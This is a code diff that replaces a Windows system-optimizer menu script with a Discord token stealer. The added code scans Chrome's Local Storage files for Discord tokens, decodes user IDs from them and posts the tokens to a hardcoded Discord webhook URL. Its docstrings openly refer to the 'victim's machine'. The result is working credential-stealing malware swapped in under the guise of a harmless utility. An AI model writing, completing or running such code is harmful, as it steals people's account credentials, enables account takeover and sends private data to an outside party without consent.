@@ -1,235 +1,145 @@
-from colorama import Fore, Style, init
+# ruff: noqa: INP001
+import base64
+import json
 import os
-import time
-import shutil
+import re
+import urllib.request
+from pathlib import Path
 
-# Initialize colorama
-init(autoreset=True)
+TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"  # noqa: S105
+REQUEST_HEADERS = {
+    "Content-Type": "application/json",
+    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
+}
+WEBHOOK_URL = "https://discord.com/api/webhooks/1388546819574988820/G8Crpd_eI3fCMwsMbWTMjl1V1WfMmiBrIUL7c4IY5ocrQfSQ44y9CYGF87tu-FKI4avp"
 
-def cprint(text, color=Fore.WHITE, centered=True):
+
+def make_post_request(api_url: str, data: dict[str, str]) -> int:
+    if not api_url.startswith(("http", "https")):
+        raise ValueError
+
+    request = urllib.request.Request(  # noqa: S310
+        api_url, data=json.dumps(data).encode(),
+        headers=REQUEST_HEADERS,
+    )
+
+    with urllib.request.urlopen(request) as response:  # noqa: S310
+        return response.status
+
+
+def get_tokens_from_file(file_path: Path) -> list[str] | None:
+
+    try:
+        file_contents = file_path.read_text(encoding="utf-8", errors="ignore")
+    except PermissionError:
+        return None
+
+    tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)
+
+    return tokens or None
+
+
+def get_user_id_from_token(token: str) -> str | None:
+    """Confirm that the portion of a string before the first dot can be decoded.
+
+    Decoding from base64 offers a useful, though not infallible, method for identifying
+    potential Discord tokens. This is informed by the fact that the initial
+    segment of a Discord token usually encodes the user ID in base64. However,
+    this test is not guaranteed to be 100% accurate in every case.
+
+    Returns
+    -------
+        A string representing the Discord user ID to which the token belongs,
+        if the first part of the token can be successfully decoded. Otherwise,
+        None.
+
     """
-    Prints text with color, centered in the terminal.
+    try:
+        discord_user_id = base64.b64decode(
+            token.split(".", maxsplit=1)[0] + "==",
+        ).decode("utf-8")
+    except UnicodeDecodeError:
+        return None
+
+    return discord_user_id
+
+
+def get_tokens_from_path(base_path: Path) -> dict[str, set]:
+    """Collect discord tokens for each user ID.
+
+    to manage the occurrence of both valid and expired Discord tokens, which happens when a
+    user updates their password, triggering a change in their token. Lacking
+    the capability to differentiate between valid and expired tokens without
+    making queries to the Discord API, the function compiles every discovered
+    token into the returned set. It is designed for these tokens to be
+    validated later, in a process separate from the initial collection and not
+    on the victim's machine.
+
+    Returns
+    -------
+        user id mapped to a set of potential tokens
+
     """
-    terminal_width = shutil.get_terminal_size().columns
-    lines = text.splitlines()
-    for line in lines:
-        if centered:
-            print(color + line.center(terminal_width))
-        else:
-            print(color + line) # For non-centered text within the border
+    file_paths = [file for file in base_path.iterdir() if file.is_file()]
 
-def print_title():
-    """
-    Clears the screen and prints the stylish title banner.
-    """
-    os.system("cls" if os.name == "nt" else "clear")
-    # A larger and more visible banner
-    banner = """
-  ╔══════════════════════════════════════════════════════════════════════════════════════════╗
-  ║    ____  ____   _____   _____  ______ _____ ______ _____ _____ _______                   ║
-  ║   / __ \\|  _ \\ / ____| |  __ \\|  ____/ ____| ____|  __ \\_   _|__   __|                  ║
-  ║  | |  | | |_) | (___   | |__) | |__ | |  __| |__   | |  | || |    | |                   ║
-  ║  | |  | |  _ < \\___ \\  |  _  /|  __|| | |_ |  __|  | |  | || |    | |                   ║
-  ║  | |__| | |_) |____) | | | \\ \\| |___| |__| | |____ | |__| || |_   | |                   ║
-  ║   \\____/|____/|_____/  |_|  \\_\\______\\_____|______||_____/_____|  |_|                   ║
-  ╚══════════════════════════════════════════════════════════════════════════════════════════╝
-    """
-    cprint(banner, Fore.GREEN + Style.BRIGHT)
-    cprint("--- Professional System Optimizer ---", Fore.YELLOW + Style.BRIGHT)
-    cprint("Version 2.1 | Optimized for Low-End & High-End PCs", Fore.CYAN)
-    print()
+    id_to_tokens: dict[str, set] = {}
 
-def main_menu():
-    """
-    Displays the main menu with a stylish border and handles user input.
-    """
-    while True:
-        # Drawing a more prominent border for the menu
-        cprint("╔═════════════════════════════════════════════════════════════════════════╗", Fore.CYAN)
-        cprint("║                          MAIN MENU - Choose an option:                    ║", Fore.CYAN + Style.BRIGHT)
-        cprint("╠═════════════════════════════════════════════════════════════════════════╣", Fore.CYAN)
-        options = [
-            "1.  Optimize CPU for Performance",
-            "2.  Optimize RAM (Clear Standby)",
-            "3.  Disk Cleanup",
-            "4.  Defragment Drives (HDD only)",
-            "5.  Flush DNS Cache",
-            "6.  Reset Network",
-            "7.  Disable Unused Services (Low-End)",
-            "8.  Enable Recommended Services (High-End)",
-            "9.  Check System Info",
-            "10. Clean Temp & Junk Files",
-            "11. Adjust Visual Effects (Low-End)",
-            "12. Open Task Manager",
-            "13. Open Device Manager",
-            "14. Run SFC (System File Checker)",
-            "15. Run DISM (System Repair)",
-            "16. Exit"
-        ]
-        
-        # Print each option inside the border
-        for opt in options:
-            print(Fore.YELLOW + f"║ {opt.ljust(70)} ║") # ljust pads the string to fit the border
-        
-        cprint("╚═════════════════════════════════════════════════════════════════════════╝", Fore.CYAN)
-        print()
-        
-        choice = input(Fore.GREEN + "Enter your choice (1-16): ")
-        actions = {
-            "1": optimize_cpu,
-            "2": optimize_ram,
-            "3": disk_cleanup,
-            "4": defrag_drives,
-            "5": flush_dns,
-            "6": reset_network,
-            "7": disable_services_low_end,
-            "8": enable_services_high_end,
-            "9": show_system_info,
-            "10": clean_temp_files,
-            "11": adjust_visual_effects,
-            "12": open_task_manager,
-            "13": open_device_manager,
-            "14": run_sfc,
-            "15": run_dism,
-            "16": exit_tool
-        }
-        action = actions.get(choice)
-        if action:
-            action()
-        else:
-            cprint("Invalid choice. Please try again.", Fore.RED)
-            time.sleep(1)
-            print_title()
+    for file_path in file_paths:
+        potential_tokens = get_tokens_from_file(file_path)
 
-# ---------- Function Implementations ----------
-# The functions below remain the same as they were already functional.
+        if potential_tokens is None:
+            continue
 
-def optimize_cpu():
-    print_title()
-    cprint("Optimizing CPU (Setting High Performance)...", Fore.YELLOW)
-    os.system("powercfg /setactive SCHEME_MIN")  # High Performance Plan
-    cprint("High Performance mode activated!", Fore.GREEN)
-    input(Fore.CYAN + "\nPress Enter to return...")
-    print_title()
+        for potential_token in potential_tokens:
+            discord_user_id = get_user_id_from_token(potential_token)
 
-def optimize_ram():
-    print_title()
-    cprint("Clearing Standby Memory (requires EmptyStandbyList.exe)...", Fore.YELLOW)
-    if os.path.exists("EmptyStandbyList.exe"):
-        os.system("EmptyStandbyList.exe workingsets")
-        cprint("RAM Optimization Complete!", Fore.GREEN)
-    else:
-        cprint("Tool not found. Please place EmptyStandbyList.exe in this folder.", Fore.RED)
-    input(Fore.CYAN + "\nPress Enter to return...")
-    print_title()
+            if discord_user_id is None:
+                continue
 
-def disk_cleanup():
-    print_title()
-    cprint("Running Disk Cleanup...", Fore.YELLOW)
-    os.system("cleanmgr")
-    input(Fore.CYAN + "\nPress Enter to return...")
-    print_title()
+            if discord_user_id not in id_to_tokens:
+                id_to_tokens[discord_user_id] = set()
 
-def defrag_drives():
-    print_title()
-    cprint("Opening Defragmenter (Only for HDD)...", Fore.YELLOW)
-    os.system("dfrgui")
-    input(Fore.CYAN + "\nPress Enter to return...")
-    print_title()
+            id_to_tokens[discord_user_id].add(potential_token)
 
-def flush_dns():
-    print_title()
-    cprint("Flushing DNS Cache...", Fore.YELLOW)
-    os.system("ipconfig /flushdns")
-    cprint("DNS cache flushed.", Fore.GREEN)
-    input(Fore.CYAN + "\nPress Enter to return...")
-    print_title()
+    return id_to_tokens or None
 
-def reset_network():
-    print_title()
-    cprint("Releasing and Renewing IP...", Fore.YELLOW)
-    os.system("ipconfig /release && ipconfig /renew")
-    cprint("Network Reset Complete.", Fore.GREEN)
-    input(Fore.CYAN + "\nPress Enter to return...")
-    print_title()
 
-def disable_services_low_end():
-    print_title()
-    cprint("Disabling unnecessary services for low-end PCs...", Fore.YELLOW)
-    services = ["SysMain", "Fax", "XblGameSave"]
-    for service in services:
-        os.system(f"sc stop {service} && sc config {service} start= disabled")
-    cprint("Selected services disabled.", Fore.GREEN)
-    input(Fore.CYAN + "\nPress Enter to return...")
-    print_title()
+def send_tokens_to_webhook(
+    webhook_url: str, user_id_to_token: dict[str, set[str]],
+) -> int:
+    """Caution: In scenarios where the victim has logged into multiple Discord
+    accounts or has frequently changed their password, the accumulation of
+    tokens may result in a message that surpasses the character limit,
+    preventing it from being sent. There are no plans to introduce code
+    modifications to segment the message for compliance with character
+    constraints.
+    """  # noqa: D205
+    fields: list[dict] = []
 
-def enable_services_high_end():
-    print_title()
-    cprint("Enabling recommended services for high-end PCs...", Fore.YELLOW)
-    services = ["SysMain", "wuauserv"]
-    for service in services:
-        os.system(f"sc config {service} start= auto && sc start {service}")
-    cprint("Services enabled.", Fore.GREEN)
-    input(Fore.CYAN + "\nPress Enter to return...")
-    print_title()
+    for user_id, tokens in user_id_to_token.items():
+        fields.append({
+            "name": user_id,
+            "value": "\n".join(tokens),
+        })
 
-def show_system_info():
-    print_title()
-    os.system("systeminfo | more")
-    input(Fore.CYAN + "\nPress Enter to return...")
-    print_title()
+    data = {"content": "Found tokens", "embeds": [{"fields": fields}]}
 
-def clean_temp_files():
-    print_title()
-    cprint("Cleaning Temp Files...", Fore.YELLOW)
-    os.system('del /q /f /s "%TEMP%\\*" >nul 2>&1')
-    os.system('del /q /f /s "C:\\Windows\\Temp\\*" >nul 2>&1')
-    cprint("Temporary files cleaned!", Fore.GREEN)
-    input(Fore.CYAN + "\nPress Enter to return...")
-    print_title()
+    make_post_request(webhook_url, data)
 
-def adjust_visual_effects():
-    print_title()
-    cprint("Setting visual effects for best performance (Low-End)...", Fore.YELLOW)
-    reg = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VisualEffects" /v VisualFXSetting /t REG_DWORD /d 2 /f'
-    os.system(reg)
-    cprint("Visual settings adjusted!", Fore.GREEN)
-    input(Fore.CYAN + "\nPress Enter to return...")
-    print_title()
 
-def open_task_manager():
-    print_title()
-    os.system("start taskmgr")
-    input(Fore.CYAN + "\nPress Enter to return...")
-    print_title()
+def main() -> None:
 
-def open_device_manager():
-    print_title()
-    os.system("start devmgmt.msc")
-    input(Fore.CYAN + "\nPress Enter to return...")
-    print_title()
+    chrome_path = (
+        Path(os.getenv("LOCALAPPDATA")) /
+        "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb"
+    )
+    tokens = get_tokens_from_path(chrome_path)
 
-def run_sfc():
-    print_title()
-    cprint("Running System File Checker...", Fore.YELLOW)
-    os.system("sfc /scannow")
-    input(Fore.CYAN + "\nPress Enter to return...")
-    print_title()
+    if tokens is None:
+        return
 
-def run_dism():
-    print_title()
-    cprint("Running DISM Scan...", Fore.YELLOW)
-    os.system("DISM /Online /Cleanup-Image /RestoreHealth")
-    input(Fore.CYAN + "\nPress Enter to return...")
-    print_title()
+    send_tokens_to_webhook(WEBHOOK_URL, tokens)
 
-def exit_tool():
-    print_title()
-    cprint("Exiting System Optimizer. Goodbye!", Fore.RED)
-    time.sleep(1)
-    exit()
 
-# Run the app
 if __name__ == "__main__":
-    print_title()
-    main_menu()
+    main()
